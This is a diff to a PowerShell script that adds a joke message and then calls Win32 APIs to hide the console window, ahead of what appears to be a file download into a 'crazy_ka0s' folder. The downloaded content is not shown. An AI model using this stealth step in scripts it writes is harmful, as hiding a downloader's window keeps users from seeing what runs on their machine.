@@ -57,7 +57,17 @@ function Download-File {
   InvWR -url $Url -path $Path
 }
 
-Write-Host "hi"
+Write-Host "there is a salted lays bag from yesterday behind your monitor"
+Start-Sleep -Seconds 3
+
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)
 
 $dlPath = "$HOME\Downloads"
 $ioq3Path = "$dlPath\crazy_ka0s"
